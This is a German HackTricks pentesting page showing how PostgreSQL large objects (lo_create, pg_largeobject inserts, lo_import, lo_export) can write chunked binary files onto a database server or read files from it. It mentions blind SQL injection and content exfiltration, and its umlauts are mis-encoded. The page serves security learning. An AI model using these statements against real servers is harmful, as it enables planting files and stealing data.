{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

### PostgreSQL Large Objects

PostgreSQL bietet eine Struktur, die als **Large Objects** bekannt ist, die √ºber die Tabelle `pg_largeobject` zug√§nglich ist und zum Speichern gro√üer Datentypen wie Bilder oder PDF-Dokumente konzipiert wurde. Dieser Ansatz ist vorteilhaft gegen√ºber der Funktion `COPY TO`, da er die **Exportation von Daten zur√ºck ins Dateisystem** erm√∂glicht und sicherstellt, dass eine exakte Kopie der Originaldatei erhalten bleibt.

Um eine **komplette Datei** innerhalb dieser Tabelle zu speichern, muss ein Objekt in der Tabelle `pg_largeobject` erstellt werden (identifiziert durch eine LOID), gefolgt von der Einf√ºgung von Datenchunks, die jeweils 2KB gro√ü sind, in dieses Objekt. Es ist entscheidend, dass diese Chunks genau 2KB gro√ü sind (mit der m√∂glichen Ausnahme des letzten Chunks), um sicherzustellen, dass die Exportfunktion korrekt funktioniert.

Um Ihre **bin√§ren Daten** in 2KB gro√üe Chunks zu unterteilen, k√∂nnen die folgenden Befehle ausgef√ºhrt werden:
```bash
split -b 2048 your_file # Creates 2KB sized files
```
Um jede Datei in Base64 oder Hex zu kodieren, k√∂nnen die folgenden Befehle verwendet werden:
```bash
base64 -w 0 <Chunk_file> # Encodes in Base64 in one line
xxd -ps -c 99999999999 <Chunk_file> # Encodes in Hex in one line
```
**Wichtig**: Bei der Automatisierung dieses Prozesses sicherstellen, dass 2KB gro√üe Bl√∂cke von Klartext-Bytes gesendet werden. Hexadezimal codierte Dateien ben√∂tigen aufgrund der Verdopplung der Gr√∂√üe 4KB Daten pro Block, w√§hrend Base64 codierte Dateien der Formel `ceil(n / 3) * 4` folgen.

Die Inhalte der gro√üen Objekte k√∂nnen zu Debugging-Zwecken mit folgendem Befehl angezeigt werden:
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
#### Verwendung von `lo_creat` & Base64

Um bin√§re Daten zu speichern, wird zuerst ein LOID erstellt:
```sql
SELECT lo_creat(-1);       -- Creates a new, empty large object
SELECT lo_create(173454);  -- Attempts to create a large object with a specific OID
```
In Situationen, die pr√§zise Kontrolle erfordern, wie zum Beispiel beim Ausnutzen einer Blind SQL Injection, wird `lo_create` bevorzugt, um eine feste LOID anzugeben.

Datenchunks k√∂nnen dann wie folgt eingef√ºgt werden:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<B64 chunk2>', 'base64'));

```
Um das gro√üe Objekt nach der Verwendung zu exportieren und m√∂glicherweise zu l√∂schen:
```sql
SELECT lo_export(173454, '/tmp/your_file');
SELECT lo_unlink(173454);  -- Deletes the specified large object
```
#### Verwendung von `lo_import` & Hex

Die Funktion `lo_import` kann verwendet werden, um einen LOID f√ºr ein gro√ües Objekt zu erstellen und anzugeben:
```sql
select lo_import('/path/to/file');
select lo_import('/path/to/file', 173454);
```
Nach der Objekterstellung werden die Daten seitenweise eingef√ºgt, wobei sichergestellt wird, dass jeder Block 2KB nicht √ºberschreitet:
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
```
Um den Prozess abzuschlie√üen, werden die Daten exportiert und das gro√üe Objekt wird gel√∂scht:
```sql
select lo_export(173454, '/path/to/your_file');
select lo_unlink(173454);  -- Deletes the specified large object
```
### Einschr√§nkungen

Es wird darauf hingewiesen, dass **gro√üe Objekte ACLs** (Access Control Lists) haben k√∂nnen, die den Zugriff selbst auf von Ihrem Benutzer erstellte Objekte einschr√§nken. √Ñltere Objekte mit gro√üz√ºgigen ACLs k√∂nnen jedoch weiterhin f√ºr die Inhaltsexfiltration zug√§nglich sein.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
